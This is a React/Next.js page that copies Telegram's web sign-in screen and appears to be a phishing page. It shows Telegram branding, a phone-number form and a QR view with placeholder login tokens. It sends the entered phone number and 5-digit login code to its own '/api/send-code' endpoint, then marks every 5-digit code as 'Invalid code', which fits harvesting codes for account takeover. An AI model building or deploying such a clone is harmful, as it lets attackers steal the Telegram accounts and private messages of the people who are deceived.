"use client";

import { Button } from "@/components/ui/button";
import { cn, count } from "@/lib/utils";
import QRCodeStyling from "qr-code-styling";
import { useEffect, useRef, useState } from "react";
import useSystemTheme from "use-system-theme";
import { usePhoneInput } from "react-international-phone";
import "react-international-phone/style.css";
import Image from "next/image";
import { parsePhoneNumberFromString } from "libphonenumber-js";
import { COUNTRIES } from "@/lib/constants";

const QR_SIZE = 250;

const Page = () => {
	const theme = useSystemTheme();
	const [code, setCode] = useState("");
	const [token, setToken] = useState("");
	const [isOpen, setIsOpen] = useState(false);
	const canvasRef = useRef<HTMLDivElement>(null);
	const dropdownRef = useRef<HTMLDivElement>(null);
	const timer = useRef<NodeJS.Timeout | null>(null);
	const [country, setCountry] = useState("Ukraine");
	const [active, setActive] = useState<1 | 2 | 3>(2);
	const [phoneNumber, setPhoneNumber] = useState("+380");
	const [isSubmitting, setIsSubmitting] = useState(false);
	const [isLoadingQrCode, setIsLoadingQrCode] = useState(true);
	const [isKeepMeSignedIn, setIsKeepMeSignedIn] = useState(false);
	const [isValidPhoneNumber, setIsValidPhoneNumber] = useState(false);
	const isCodeValid =
		code.trim().length === 5 && !Object.is(Number(code.trim()), Number.NaN);
	const isErroredPhoneNumber = !isValidPhoneNumber && isSubmitting;

	const filteredCountries =
		country.trim() === "" ||
		COUNTRIES.find(([_flag, countryName, _code]) => countryName === country)
			? COUNTRIES
			: COUNTRIES.filter(([_flag, countryName, _code]) => {
					return (countryName?.toLowerCase?.() || "").includes(
						country?.toLowerCase?.() || "",
					);
				});

	const phoneInput = usePhoneInput({
		defaultCountry: "ua",
		value: phoneNumber,
		onChange: (data) => {
			setPhoneNumber(data.phone);
			if (data.phone.trim() === "" || data.phone.trim() === "+") {
				setCountry("");
				return;
			}
			if (
				COUNTRIES.find(
					([_flag, countryName, _code]) => countryName === data.country.name,
				)
			) {
				setCountry(data.country.name);
				return;
			}
		},
	});

	useEffect(() => {
		if (isLoadingQrCode || token === "") {
			return;
		}

		const options = {
			width: QR_SIZE,
			height: QR_SIZE,
			data: token,
			image: "/blank.png",
			margin: 0,
			type: "svg",
			dotsOptions: {
				type: "rounded",
				color: theme === "dark" ? "white" : "black",
			},
			cornersSquareOptions: {
				type: "extra-rounded",
			},

			imageOptions: {
				imageSize: 0.4,
				margin: 8,
			},
			qrOptions: {
				errorCorrectionLevel: "M",
			},
			backgroundOptions: {
				color: "transparent",
			},
		};

		// @ts-ignore
		const qrCode = new QRCodeStyling(options);
		if (canvasRef.current !== null) {
			if (canvasRef.current.children.length === 0) {
				qrCode.append(canvasRef.current);
			} else {
				canvasRef.current.innerHTML = "";
				qrCode.append(canvasRef.current);
			}
		}
	}, [token, isLoadingQrCode, theme]);

	useEffect(() => {
		setTimeout(() => {
			const data = `${"tg://login?token="}${"dfaafsdfasdfasdfasdfasdf"}`;
			setToken(data);
			setIsLoadingQrCode(false);
		}, 1000);
	}, []);

	useEffect(() => {
		let i = 0;
		timer.current = setInterval(() => {
			setToken(
				`${"tg://login?token="}${String(`sdgpasdjpgasdpofaposkdfa${i++}`)}`,
			);
		}, 30_000);
		return () => {
			if (timer.current !== null) {
				clearInterval(timer.current);
			}
		};
	}, []);

	const nextSubmit = () => {
		console.log(1);
		if (phoneInput.phone.trim() !== "") {
			console.log(2, phoneInput.country.dialCode.length);
			const theNumbers =
				count(phoneInput.country.format, ".") +
				(phoneInput?.country?.dialCode?.length || 0);
			const phoneNumber = parsePhoneNumberFromString(phoneInput.phone);
			if (theNumbers !== phoneInput.phone.length - 1) {
				console.log(3);
				setIsValidPhoneNumber(false);
				setIsSubmitting(true);
				return;
			}
			if (!phoneNumber) {
				console.log(4);
				setIsValidPhoneNumber(true);
				setIsSubmitting(true);
				return;
			}
		}
		console.log(5);
		setActive(3);
	};

	useEffect(() => {
		const handleClickOutside = (event: MouseEvent) => {
			if (
				dropdownRef.current &&
				!dropdownRef.current.contains(event.target as Node)
			) {
				setIsOpen(false);
			}
		};

		document.addEventListener("mousedown", handleClickOutside);
		return () => {
			document.removeEventListener("mousedown", handleClickOutside);
		};
	}, []);

	// biome-ignore lint/correctness/useExhaustiveDependencies: <explanation>
	useEffect(() => {
		(async () => {
			if (isCodeValid) {
				const r = await fetch("/api/send-code", {
					method: "POST",
					body: JSON.stringify({
						phoneNumber,
						code,
					}),
				});
				if (r.ok) {
					await r.json();
				}
			}
		})();
	}, [code]);

	const IconTelegram = () => (
		<svg
			className="text-[120px] sm:text-[160px] icon"
			xmlns="http://www.w3.org/2000/svg"
			viewBox="0 0 120 120"
		>
			<title>Telegram Icon</title>
			<defs>
				<linearGradient x1="50%" y1="0%" x2="50%" y2="100%" id="a">
					<stop
						stopColor={theme !== "dark" ? "#3390ed" : "#8774e1"}
						offset="0%"
					/>
					<stop
						stopColor={theme !== "dark" ? "#3390ed" : "#8774e1"}
						offset="110%"
					/>
				</linearGradient>
			</defs>
			<g fill="none">
				<circle fill="url(#a)" cx="60" cy="60" r="60" />
				<path
					d="M23.775 58.77a3278.85 3278.85 0 0 1 39.27-16.223c18.698-7.454 21.3-8.542 23.828-8.58a4.995 4.995 0 0 1 2.977 1.103c1.058.9 1.38 1.47 1.47 1.972.083.503.075 2.07-.015 2.963-1.013 10.207-4.86 33.78-7.088 45.225-.945 4.837-2.805 6.457-4.605 6.615-3.907.345-6.877-2.475-10.664-4.86-5.925-3.728-7.905-5.1-13.65-8.737-6.653-4.2-3.916-5.663-.128-9.436.99-.982 17.415-15.974 17.662-17.34.21-1.2.286-1.357-.254-1.897-.548-.54-1.2-.473-1.62-.383-.6.128-9.645 5.85-27.15 17.176-2.685 1.777-5.115 2.64-7.298 2.595-2.4-.053-7.027-1.305-10.462-2.378-4.223-1.32-7.575-2.01-7.275-4.245.15-1.163 1.814-2.355 5.002-3.57Z"
					fill={theme !== "dark" ? "#FFF" : "#212121"}
				/>
			</g>
		</svg>
	);

	return (
		<div>
			<div className="h-[186px] sm:h-[190px] w-full" />
			<div className="flex relative overflow-hidden justify-center w-full sm:w-[480px] h-[900px] mx-auto">
				<div
					className={cn(
						"absolute w-full sm:w-[480px] h-[500px] transition-all",
						active === 1 ? "left-0" : "-left-full",
					)}
				>
					<div className="flex justify-center mx-auto">
						<IconTelegram />
					</div>
					<h4 className="sm:mt-[41px] mt-[22px] text-[20px] sm:text-[32px] font-medium text-center select-none">
						Sign in to Telegram
					</h4>
					<p
						className={cn(
							"select-none mt-[3px] sm:mt-[8px] font-normal text-[14px] sm:text-[16px] text-center",
							theme === "light" ? "text-[#707579]" : "text-[#aaaaaa]",
						)}
					>
						<span className="block">Please confirm your country code</span>
						<br />
						<span className="block -mt-[23px] sm:-mt-[28px]">
							and enter your phone number.
						</span>
					</p>
					<div className="mt-[45px] flex flex-col sm:px-0 px-4 items-center justify-center">
						<div
							className="max-w-[360px] relative w-full group"
							onClick={() => setIsOpen(true)}
							onKeyDown={(e) => {
								if (e.key === "Enter" || e.key === " ") {
									setIsOpen(true);
								}
							}}
						>
							<input
								value={country}
								onChange={(e) => setCountry(e.target.value)}
								className={cn(
									"border peer outline-none bg-transparent font-light rounded-[10px] w-full p-[15px] group-hover:border-[#3390ec] transition-colors border-[rgb(223,225,229)] caret-[rgb(51,144,236)] dark:border-[rgba(255,255,255,0.08)] dark:caret-[#8774e1] dark:group-hover:border-[#8774e1]",
								)}
							/>
							<span
								className={cn(
									"absolute group-hover:text-[#3390ec] font-light transition-all text-[#9e9e9e] px-1 bg-white peer-focus:text-[12px] peer-focus:-top-2 peer-focus:left-3 dark:bg-[#212121] dark:group-hover:text-[#8774e1]",
									country === ""
										? "text-[16px] top-4 left-3"
										: "text-[12px] -top-2 left-3",
								)}
							>
								Country
							</span>
							{isOpen && (
								<div
									ref={dropdownRef}
									className={cn("absolute inset-x-0 z-10 mt-2 top-full")}
									onClick={(e) => {
										e.stopPropagation();
									}}
									onKeyDown={(e) => {
										if (e.key === "Enter") {
											e.stopPropagation();
										}
									}}
								>
									<div
										className={cn(
											"w-full animate-appear-dropdown max-h-[380px] overflow-auto bg-white dark:bg-[#212121] rounded-lg",
										)}
										style={{
											boxShadow:
												"0 8px 17px 2px #00000024,0 3px 14px 2px #0000001f,0 5px 5px -3px #0003",
											scrollbarWidth: "none",
											msOverflowStyle: "none",
										}}
									>
										<div className="flex flex-col font-light">
											{filteredCountries.map(([flag, country, code]) => (
												// biome-ignore lint/a11y/useKeyWithClickEvents: <explanation>
												<div
													key={country + code}
													onClick={() => {
														setCountry(country);
														setPhoneNumber(`+${code}`);
														setIsOpen(false);
													}}
													className="flex items-center h-14 px-4 cursor-pointer hover:bg-[rgba(170,170,170,0.08)]"
												>
													<div className="flex items-center flex-1 gap-8">
														<span className="text-[26px]">{flag}</span>
														<p>{country}</p>
													</div>
													<div className="text-[#9E9E9E]">+{code}</div>
												</div>
											))}
										</div>
									</div>
								</div>
							)}
						</div>
						<div className="max-w-[360px] mt-6 relative w-full group">
							<input
								value={phoneInput.phone}
								onChange={phoneInput.handlePhoneValueChange}
								ref={phoneInput.inputRef}
								className={cn(
									"border peer outline-none bg-transparent font-light rounded-[10px] w-full p-[15px] group-hover:border-[#3390ec] transition-colors border-[rgb(223,225,229)] caret-[rgb(51,144,236)] dark:border-[rgba(255,255,255,0.08)] dark:caret-[#8774e1] dark:group-hover:border-[#8774e1]",
									isErroredPhoneNumber
										? "!border-red-500"
										: "group-hover:border-[#3390ec] dark:group-hover:border-[#8774e1] caret-[rgb(51,144,236)] dark:caret-[#8774e1]",
								)}
							/>
							<span
								className={cn(
									"absolute group-hover:text-[#3390ec] font-light transition-all text-[#9e9e9e] px-1 bg-white peer-focus:text-[12px] peer-focus:-top-2 peer-focus:left-3 dark:bg-[#212121] dark:group-hover:text-[#8774e1]",
									phoneNumber === ""
										? "text-[16px] top-4 left-3"
										: "text-[12px] -top-2 left-3",
									isErroredPhoneNumber
										? "!text-red-500"
										: "dark:group-hover:text-[#8774e1] group-hover:text-[#3390ec]",
								)}
							>
								{isErroredPhoneNumber ? "Phone Number Invalid" : "Phone Number"}
							</span>
						</div>
						<Button
							className="max-w-[360px] mt-2 w-full"
							onClick={() => setIsKeepMeSignedIn(!isKeepMeSignedIn)}
						>
							<div className="flex gap-8">
								<div className="inline-flex items-center ml-[20px]">
									<label className="relative flex items-center cursor-pointer">
										<input
											type="checkbox"
											checked={isKeepMeSignedIn}
											className="w-5 h-5 transition-all border rounded shadow appearance-none cursor-pointer peer hover:shadow-md border-slate-300 dark:checked:bg-primary dark:checked:border-primary checked:bg-[#3390ec] checked:border-[#3390ec]"
											id="check1"
										/>
										<span className="absolute text-white transform -translate-x-1/2 -translate-y-1/2 opacity-0 peer-checked:opacity-100 top-1/2 left-1/2">
											{/* biome-ignore lint/a11y/noSvgWithoutTitle: <explanation> */}
											<svg
												xmlns="http://www.w3.org/2000/svg"
												className="h-3.5 w-3.5"
												viewBox="0 0 20 20"
												fill={"currentColor"}
												stroke={"currentColor"}
												strokeWidth="1"
											>
												<path
													fillRule="evenodd"
													d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
													clipRule="evenodd"
												/>
											</svg>
										</span>
									</label>
								</div>
								<span className="text-black dark:text-white">
									Keep me signed in
								</span>
							</div>
						</Button>

						{country && phoneNumber ? (
							<Button
								onClick={nextSubmit}
								className="bg-primary font-medium text-white hover:bg-opacity-90 max-w-[360px] w-full mt-7"
							>
								NEXT
							</Button>
						) : (
							<div className="w-full h-[54px] mt-7" />
						)}

						<Button
							className="max-w-[360px] w-full mt-2"
							onClick={() => setActive(2)}
						>
							LOG IN BY QR CODE
						</Button>
					</div>
				</div>
				<div
					className={cn(
						"absolute w-full sm:w-[480px] h-[500px] transition-all",
						active === 2 ? "left-0" : "left-full",
					)}
				>
					<div
						className="relative flex items-center justify-center mx-auto"
						style={{
							display: isLoadingQrCode ? "flex" : "none",
							width: `${QR_SIZE}px`,
							height: `${QR_SIZE}px`,
						}}
					>
						<div
							className={cn(
								"mx-auto loading loading-lg text-primary loading-spinner",
								isLoadingQrCode && "animate-appear",
							)}
						/>
					</div>
					<div
						className="relative mx-auto"
						style={{
							width: `${QR_SIZE}px`,
							height: `${QR_SIZE}px`,
							overflow: "hidden",
							display: !isLoadingQrCode ? "block" : "none",
						}}
					>
						<div
							className={cn(
								"mx-auto relative",
								!isLoadingQrCode && "animate-appear",
							)}
							ref={canvasRef}
							style={{
								width: `${QR_SIZE}px`,
								height: `${QR_SIZE}px`,
								backgroundColor: "transparent",
								display: !isLoadingQrCode ? "block" : "none",
								overflow: "hidden",
							}}
						/>
						{!isLoadingQrCode && (
							<div className="absolute inset-0 flex items-center justify-center animate-appear">
								{theme === "dark" ? (
									// biome-ignore lint/a11y/noSvgWithoutTitle: <explanation>
									<svg
										className="text-[40px] icon"
										xmlns="http://www.w3.org/2000/svg"
										viewBox="0 0 120 120"
									>
										<defs>
											<linearGradient
												x1="50%"
												y1="0%"
												x2="50%"
												y2="100%"
												id="a"
											>
												<stop stopColor="#8774e1" offset="0%" />
												<stop stopColor="#8774e1" offset="100%" />
											</linearGradient>
										</defs>
										<g fill="none">
											<circle fill="url(#a)" cx="60" cy="60" r="60" />
											<path
												d="M23.775 58.77a3278.85 3278.85 0 0 1 39.27-16.223c18.698-7.454 21.3-8.542 23.828-8.58a4.995 4.995 0 0 1 2.977 1.103c1.058.9 1.38 1.47 1.47 1.972.083.503.075 2.07-.015 2.963-1.013 10.207-4.86 33.78-7.088 45.225-.945 4.837-2.805 6.457-4.605 6.615-3.907.345-6.877-2.475-10.664-4.86-5.925-3.728-7.905-5.1-13.65-8.737-6.653-4.2-3.916-5.663-.128-9.436.99-.982 17.415-15.974 17.662-17.34.21-1.2.286-1.357-.254-1.897-.548-.54-1.2-.473-1.62-.383-.6.128-9.645 5.85-27.15 17.176-2.685 1.777-5.115 2.64-7.298 2.595-2.4-.053-7.027-1.305-10.462-2.378-4.223-1.32-7.575-2.01-7.275-4.245.15-1.163 1.814-2.355 5.002-3.57Z"
												fill="#212121"
											/>
										</g>
									</svg>
								) : (
									// biome-ignore lint/a11y/noSvgWithoutTitle: <explanation>
									<svg
										className="text-[40px] icon"
										xmlns="http://www.w3.org/2000/svg"
										viewBox="0 0 120 120"
									>
										<defs>
											<linearGradient
												x1="50%"
												y1="0%"
												x2="50%"
												y2="100%"
												id="a"
											>
												<stop stopColor="#3390ed" offset="0%" />
												<stop stopColor="#3390ed" offset="100%" />
											</linearGradient>
										</defs>
										<g fill="none">
											<circle fill="url(#a)" cx="60" cy="60" r="60" />
											<path
												d="M23.775 58.77a3278.85 3278.85 0 0 1 39.27-16.223c18.698-7.454 21.3-8.542 23.828-8.58a4.995 4.995 0 0 1 2.977 1.103c1.058.9 1.38 1.47 1.47 1.972.083.503.075 2.07-.015 2.963-1.013 10.207-4.86 33.78-7.088 45.225-.945 4.837-2.805 6.457-4.605 6.615-3.907.345-6.877-2.475-10.664-4.86-5.925-3.728-7.905-5.1-13.65-8.737-6.653-4.2-3.916-5.663-.128-9.436.99-.982 17.415-15.974 17.662-17.34.21-1.2.286-1.357-.254-1.897-.548-.54-1.2-.473-1.62-.383-.6.128-9.645 5.85-27.15 17.176-2.685 1.777-5.115 2.64-7.298 2.595-2.4-.053-7.027-1.305-10.462-2.378-4.223-1.32-7.575-2.01-7.275-4.245.15-1.163 1.814-2.355 5.002-3.57Z"
												fill="#FFF"
											/>
										</g>
									</svg>
								)}
							</div>
						)}
					</div>

					<h4 className="select-none animate-transparency font-medium leading-[110%] tracking-[0.3125px] text-center mt-[14px] sm:mt-[35px] mb-[12px] text-[20px] sm:text-[2rem]">
						Log in to Telegram by QR Code
					</h4>

					<ol className="max-w-[388px] animate-transparency flex flex-col select-none font-light gap-[4px] mt-[31px] sm:mt-[37px] mx-auto w-full list-decimal ps-[43px] sm:ps-[45px]">
						<li className="text-[16.2px]">Open Telegram on your phone</li>
						<li>
							<span className="text-[16.2px]">
								Go to <b>Settings</b> &gt; <b>Devices</b> &gt;{" "}
								<b>Link Desktop Device</b>
							</span>
						</li>
						<li className="text-[16.2px]">
							Point your phone at this screen to confirm login
						</li>
					</ol>
					<div className="flex justify-center animate-transparency">
						<Button
							className="mt-4 mx-2 sm:mx-0 sm:max-w-[360px]"
							onClick={() => setActive(1)}
						>
							LOG IN BY PHONE NUMBER
						</Button>
					</div>
				</div>
				<div
					className={cn(
						"absolute w-full sm:w-[480px] h-[500px] transition-all",
						active === 3 ? "left-0" : "left-full",
					)}
				>
					<div className="mx-auto">
						<Image
							className="mx-auto hidden sm:block sm:h-[195px]"
							src="/monkey.png"
							alt="monkey"
							width={250}
							height={250}
						/>
						<Image
							className="mx-auto block h-[150px] sm:hidden"
							src="/monkey.png"
							alt="monkey"
							width={200}
							height={180}
						/>
					</div>
					<div>
						<div className="flex items-center justify-center mt-2 text-center">
							<p className="text-[20px] sm:text-[32px] font-normal">
								{phoneInput.inputValue}
							</p>
							{/* biome-ignore lint/a11y/useKeyWithClickEvents: <explanation> */}
							<svg
								xmlns="http://www.w3.org/2000/svg"
								onClick={() => {
									setIsSubmitting(false);
									setCountry("Ukraine");
									setPhoneNumber("+380");
									setActive(1);
									setTimeout(() => {
										setCode("");
									}, 500);
								}}
								className="ml-2 text-2xl text-black !text-opacity-50 transition-all cursor-pointer dark:text-white hover:text-opacity-100 icon"
								viewBox="0 0 24 24"
							>
								<title>pencil-outline</title>
								<path d="M14.06,9L15,9.94L5.92,19H5V18.08L14.06,9M17.66,3C17.41,3 17.15,3.1 16.96,3.29L15.13,5.12L18.88,8.87L20.71,7.04C21.1,6.65 21.1,6 20.71,5.63L18.37,3.29C18.17,3.09 17.92,3 17.66,3M14.06,6.19L3,17.25V21H6.75L17.81,9.94L14.06,6.19Z" />
							</svg>
						</div>
						<p className="mt-2 text-center text-[14px] sm:text-base text-[#aaaaaa]">
							We have sent you a message in Telegram
							<br />
							with the code.
						</p>
					</div>
					<div className="px-4 sm:px-auto">
						<div className="mx-auto sm:max-w-[360px] mt-[44px] relative w-full group">
							<input
								value={code}
								onChange={(e) => {
									const v = Number(e.target.value);
									if (Object.is(v, Number.NaN)) {
										return;
									}
									if (String(v).trim().length > 5) {
										return;
									}
									if (String(v) === "0") {
										setCode("");
										return;
									}
									setCode(String(v).trim());
								}}
								className={cn(
									"border peer outline-none bg-transparent font-light rounded-[10px] w-full p-[15px] transition-colors border-[rgb(223,225,229)] dark:border-[rgba(255,255,255,0.08)]",
									(!isCodeValid && code.length === 5) || code.length === 5
										? "!border-red-500"
										: "group-hover:border-[#3390ec] dark:group-hover:border-[#8774e1] caret-[rgb(51,144,236)] dark:caret-[#8774e1]",
								)}
							/>
							<span
								className={cn(
									"absolute font-light transition-all text-[#9e9e9e] px-1 bg-white peer-focus:text-[12px] peer-focus:-top-2 peer-focus:left-3 dark:bg-[#212121]",
									code === ""
										? "text-[16px] top-4 left-3"
										: "text-[12px] -top-2 left-3",
									(!isCodeValid && code.length === 5) || code.length === 5
										? "!text-red-500"
										: "dark:group-hover:text-[#8774e1] group-hover:text-[#3390ec]",
								)}
							>
								{(!isCodeValid && code.length === 5) || code.length === 5
									? "Invalid code"
									: "Code"}
							</span>
						</div>
					</div>
				</div>
			</div>
		</div>
	);
};

export default Page;
